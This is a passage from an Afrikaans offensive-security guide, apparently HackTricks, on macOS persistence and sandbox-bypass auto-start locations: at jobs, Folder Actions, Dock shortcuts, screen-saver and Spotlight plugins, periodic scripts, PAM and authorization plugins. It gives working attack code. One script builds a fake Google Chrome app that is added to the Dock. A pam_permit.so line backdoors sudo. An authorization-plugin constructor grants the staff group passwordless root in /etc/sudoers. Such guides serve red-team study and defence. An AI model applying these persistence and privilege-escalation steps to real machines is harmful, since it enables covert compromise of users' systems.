As jy ’n **ZIP**-lêer as ’n **Login Item** stoor, sal die **`Archive Utility`** dit oopmaak. As die zip byvoorbeeld in **`~/Library`** gestoor is en die vouer **`LaunchAgents/file.plist`** met ’n backdoor bevat het, sal daardie vouer geskep word (dit bestaan nie by verstek nie) en die plist sal bygevoeg word. Die volgende keer wanneer die gebruiker weer aanmeld, sal die **backdoor wat in die plist aangedui word, uitgevoer word**.

Nog ’n opsie sou wees om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruiker se HOME te skep. As die vouer LaunchAgents dus reeds bestaan, sal hierdie tegniek steeds werk.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet **`at`** **uitvoer**, en dit moet **enabled** wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Jy moet **`at`** **uitvoer**, en dit moet **enabled** wees

#### **Beskrywing**

`at`-take is ontwerp om **eenmalige take te skeduleer** wat op bepaalde tye uitgevoer moet word. Anders as cron jobs word `at`-take outomaties ná uitvoering verwyder. Dit is belangrik om daarop te let dat hierdie take oor stelselherbeginsels heen persistent bly, wat hulle onder sekere omstandighede ’n potensiële security concern maak.<sup>[[16]](#references)</sup>

By **verstek** is hulle **disabled**, maar die **root**-gebruiker kan **hulle enable** met:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dit sal oor 1 uur 'n lêer skep:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Kontroleer die job queue met `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Hierbo kan ons twee geskeduleerde jobs sien. Ons kan die besonderhede van die job druk deur `at -c JOBNUMBER` te gebruik.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> As AT-take nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.

Die **job-lêers** kan gevind word by `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Die lêernaam bevat die queue, die job-nommer en die tyd waarop dit geskeduleer is om te loop. Kom ons kyk byvoorbeeld na `a0001a019bdcd2`.

- `a` - dit is die queue
- `0001a` - job-nommer in hex, `0x1a = 26`
- `019bdcd2` - tyd in hex. Dit verteenwoordig die minute wat sedert epoch verloop het. `0x019bdcd2` is `26991826` in desimaal. As ons dit met 60 vermenigvuldig, kry ons `1619509560`, wat `GMT: Dinsdag 27 April 2021 7:46:00` is.

As ons die job-lêer druk, vind ons dat dit dieselfde inligting bevat wat ons met `at -c` gekry het.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet `osascript` met argumente kan aanroep om met **`System Events`** te kommunikeer sodat jy Folder Actions kan konfigureer
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Dit het basiese TCC-permissies soos Desktop, Documents en Downloads

#### Ligging

- **`/Library/Scripts/Folder Action Scripts`**
- Root vereis
- **Trigger**: Toegang tot die gespesifiseerde vouer
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Toegang tot die gespesifiseerde vouer

#### Beskrywing & Exploitation

Folder Actions is scripts wat outomaties deur veranderinge in ’n vouer geaktiveer word, soos die byvoeging of verwydering van items, of ander aksies soos die oopmaak of verander van die grootte van die vouervenster. Hierdie aksies kan vir verskeie take gebruik word en kan op verskillende maniere geaktiveer word, soos deur die Finder UI of terminale opdragte.<sup>[[17]](#references)[[18]](#references)</sup>

Om Folder Actions op te stel, het jy opsies soos:

1. Om ’n Folder Action-workflow met [Automator](https://support.apple.com/guide/automator/welcome/mac) te skep en dit as ’n diens te installeer.
2. Om ’n script handmatig via Folder Actions Setup in die kontekskieslys van ’n vouer te koppel.
3. Om OSAScript te gebruik om Apple Event-boodskappe na die `System Events.app` te stuur vir die programmatiese opstelling van ’n Folder Action.
- Hierdie metode is veral nuttig om die aksie in die stelsel te integreer, wat ’n mate van persistence bied.

Die volgende script is ’n voorbeeld van wat deur ’n Folder Action uitgevoer kan word:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Om die bogenoemde script bruikbaar deur Folder Actions te maak, compileer dit met:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nadat die script saamgestel is, stel Folder Actions op deur die onderstaande script uit te voer. Hierdie script sal Folder Actions wêreldwyd aktiveer en spesifiek die voorheen saamgestelde script aan die Desktop-lêergids koppel.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Voer die opstellingskrip uit met:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Dit is die manier om hierdie persistence via GUI te implementeer:

Dit is die script wat uitgevoer sal word:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompileer dit met: `osacompile -l JavaScript -o folder.scpt source.js`

Skuif dit na:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Maak daarna die `Folder Actions Setup`-app oop, kies die **vouer wat jy wil monitor** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

As jy nou daardie vouer met **Finder** oopmaak, sal jou script uitgevoer word.

Hierdie konfigurasie is in die **plist** geleë by **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**, in base64-formaat, gestoor.

Kom ons probeer nou om hierdie persistence sonder GUI-toegang voor te berei:

1. **Kopieer `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** na `/tmp` om dit te rugsteun:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Verwyder** die Folder Actions wat jy pas opgestel het:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Noudat ons ’n leë omgewing het:

3. Kopieer die rugsteunlêer: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Maak die Folder Actions Setup.app oop om hierdie konfigurasie te verwerk: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Dit het nie vir my gewerk nie, maar dit is die instruksies uit die writeup:(

### Dock-kortpaaie

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet ’n malicious application binne die stelsel geïnstalleer hê
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Wanneer die gebruiker op die app binne die dock klik

#### Beskrywing & Exploitation

Al die applications wat in die Dock verskyn, word in die plist gespesifiseer: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Dit is moontlik om **’n application by te voeg** met net:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Deur **social engineering** te gebruik, kon jy **byvoorbeeld Google Chrome naboots** binne die dock en eintlik jou eie script uitvoer:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Kleurkiesers

Skrywe: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- ’n Baie spesifieke aksie moet plaasvind
- Jy sal in ’n ander sandbox eindig
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/Library/ColorPickers`
- Root word vereis
- Sneller: Gebruik die kleurkieser
- `~/Library/ColorPickers`
- Sneller: Gebruik die kleurkieser

#### Beskrywing & Exploit

**Compile ’n color picker** bundle met jou code (jy kan byvoorbeeld [**hierdie een**](https://github.com/viktorstrate/color-picker-plus) gebruik) en voeg ’n constructor by (soos in die [Screen Saver-afdeling](macos-auto-start-locations.md#screen-saver)) en kopieer die bundle na `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Dan, wanneer die color picker geaktiveer word, behoort jou code ook uitgevoer te word.

Let daarop dat die binary wat jou library laai, ’n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Nuttig om sandbox te omseil: **Nee, omdat jy jou eie toepassing moet uitvoer**
- TCC bypass: ???

#### Ligging

- 'n Spesifieke toepassing

#### Beskrywing & Exploit

'n Voorbeeld van 'n toepassing met 'n Finder Sync Extension [**kan hier gevind word**](https://github.com/D00MFist/InSync).

Toepassings kan `Finder Sync Extensions` hê. Hierdie uitbreiding sal binne 'n toepassing geplaas word wat uitgevoer sal word. Daarbenewens moet die uitbreiding **onderteken** wees met 'n geldige Apple developer certificate om sy kode te kan uitvoer, dit moet **sandboxed** wees (hoewel ontspanne uitsonderings bygevoeg kan word) en dit moet met iets soos die volgende geregistreer wees:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy sal in 'n algemene application sandbox eindig
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/System/Library/Screen Savers`
- Root required
- **Trigger**: Kies die screen saver
- `/Library/Screen Savers`
- Root required
- **Trigger**: Kies die screen saver
- `~/Library/Screen Savers`
- **Trigger**: Kies die screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beskrywing & Exploit

Skep 'n nuwe projek in Xcode en kies die template om 'n nuwe **Screen Saver** te genereer. Voeg dan jou code daarby, byvoorbeeld die volgende code om logs te genereer.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** dit, en kopieer die `.saver` bundle na **`~/Library/Screen Savers`**. Maak dan die Screen Saver GUI oop, en as jy net daarop klik, behoort dit baie logs te genereer:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Let daarop dat, omdat jy binne die entitlements van die binary wat hierdie kode laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`** kan vind, jy **binne die algemene application sandbox** sal wees.

Saver-kode:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy sal in 'n application sandbox eindig
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Die sandbox lyk baie beperk

#### Location

- `~/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- `/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- New app required

#### Description & Exploitation

Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
Om hierdie vinnige soekvermoë moontlik te maak, hou Spotlight 'n **proprietary database** in stand en skep dit 'n indeks deur **die meeste lêers te ontleed**, wat vinnige soektogte deur beide lêername en hul inhoud moontlik maak.<sup>[[25]](#references)</sup>

Die onderliggende meganisme van Spotlight behels 'n sentrale proses genaamd 'mds', wat staan vir **'metadata server'.** Hierdie proses koördineer die hele Spotlight-diens. Daarbenewens is daar verskeie 'mdworker'-daemons wat 'n verskeidenheid instandhoudingstake uitvoer, soos om verskillende lêertipes te indekseer (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight importer plugins, of **".mdimporter bundles**", wat Spotlight in staat stel om inhoud oor 'n uiteenlopende reeks lêerformate te verstaan en te indekseer.

Die plugins of **`.mdimporter`** bundles is op die plekke wat voorheen genoem is geleë, en indien 'n nuwe bundle verskyn, word dit binne 'n minuut gelaai (geen behoefte om enige diens te herbegin nie). Hierdie bundles moet aandui **watter lêertipe en uitbreidings hulle kan bestuur**, sodat Spotlight dit sal gebruik wanneer 'n nuwe lêer met die aangeduide uitbreiding geskep word.

Dit is moontlik om **alle gelaaide `mdimporters` te vind** deur die volgende uit te voer:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
En byvoorbeeld word **/Library/Spotlight/iBooksAuthor.mdimporter** gebruik om hierdie tipe lêers te ontleed (uitbreidings `.iba` en `.book`, onder andere):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> As jy die Plist van ander `mdimporter` nagaan, sal jy dalk nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit ’n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en nie uitbreidings hoef te spesifiseer nie.
>
> Boonop geniet stelselverstek-inproppe altyd voorkeur, so ’n aanvaller kan slegs toegang kry tot lêers wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.

Om jou eie importer te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), en dan die naam en **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun, en dit in **`schema.xml`** weerspieël.\
Verander dan die kode van die funksie **`GetMetadataForFile`** om jou payload uit te voer wanneer ’n lêer met die verwerkte uitbreiding geskep word.

Laastens, **bou en kopieer jou nuwe `.mdimporter`** na een van die drie vorige liggings. Jy kan nagaan of dit gelaai is deur die **logs te monitor** of **`mdimport -L`** uit te voer.

### ~~Voorkeurpaneel~~

> [!CAUTION]
> Dit lyk nie asof dit meer werk nie.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Nuttig om sandbox bypass te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Dit vereis ’n spesifieke gebruikerhandeling
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beskrywing

Dit lyk nie asof dit meer werk nie.<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> Hier kan jy start locations vind wat nuttig is vir **sandbox bypass**, wat jou toelaat om eenvoudig iets uit te voer deur dit **in ’n lêer te skryf** terwyl jy **root** is en/of ander **vreemde voorwaardes** vereis.

### Periodiek

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Nuttig om sandbox bypass te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root word vereis
- **Trigger**: Wanneer die tyd aanbreek
- `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
- Root word vereis
- **Trigger**: Wanneer die tyd aanbreek

#### Beskrywing & Exploitation

Die periodieke scripts (**`/etc/periodic`**) word uitgevoer as gevolg van die **launch daemons** wat in `/System/Library/LaunchDaemons/com.apple.periodic*` gekonfigureer is. Let daarop dat scripts wat in `/etc/periodic/` gestoor word, uitgevoer word as die **eienaar van die lêer,** so dit sal nie vir ’n potensiële privilege escalation werk nie.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Daar is ander periodieke skripte wat uitgevoer sal word en in **`/etc/defaults/periodic.conf`** aangedui word:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
As jy daarin slaag om enige van die lêers `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` te skryf, sal dit **vroeër of later uitgevoer word**.

> [!WARNING]
> Let daarop dat die periodic script **as die eienaar van die script uitgevoer sal word**. As ’n gewone gebruiker dus die script besit, sal dit as daardie gebruiker uitgevoer word (dit kan privilege escalation-aanvalle voorkom).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Root word altyd vereis

#### Beskrywing & Exploitation

Omdat PAM meer op **persistence** en malware fokus as op maklike uitvoering binne macOS, sal hierdie blog nie ’n gedetailleerde verduideliking gee nie; **lees die writeups om hierdie tegniek beter te verstaan**.<sup>[[28]](#references)</sup>

Kontroleer PAM-modules met:
```bash
ls -l /etc/pam.d
```
'n Persistence/privilege escalation-tegniek wat PAM misbruik, is so eenvoudig soos om die module /etc/pam.d/sudo te wysig en die volgende reël aan die begin by te voeg:
```bash
auth       sufficient     pam_permit.so
```
So dit sal **lyk soos** iets soos hierdie:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
En daarom sal enige poging om **`sudo` te gebruik werk**.

> [!CAUTION]
> Let daarop dat hierdie gids deur TCC beskerm word, dus is dit hoogs waarskynlik dat die gebruiker ’n prompt sal kry wat toegang versoek.

Nog ’n goeie voorbeeld is su, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM modules te gee (en jy kan ook hierdie lêer backdoor):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en ekstra configs maak
- TCC bypass: ???

#### Ligging

- `/Library/Security/SecurityAgentPlugins/`
- Root word vereis
- Dit is ook nodig om die authorization database te konfigureer om die plugin te gebruik

#### Beskrywing & Exploitation

Jy kan 'n authorization plugin skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om persistence te handhaaf. Vir meer inligting oor hoe om een van hierdie plugins te skep, kyk na die vorige writeups (en wees versigtig, want 'n swak geskryfde een kan jou uitsluit en jy sal jou Mac vanuit recovery mode moet skoonmaak).<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Skuif** die bundle na die ligging waar dit gelaai moet word:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Voeg laastens die **reël** by om hierdie Plugin te laai:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

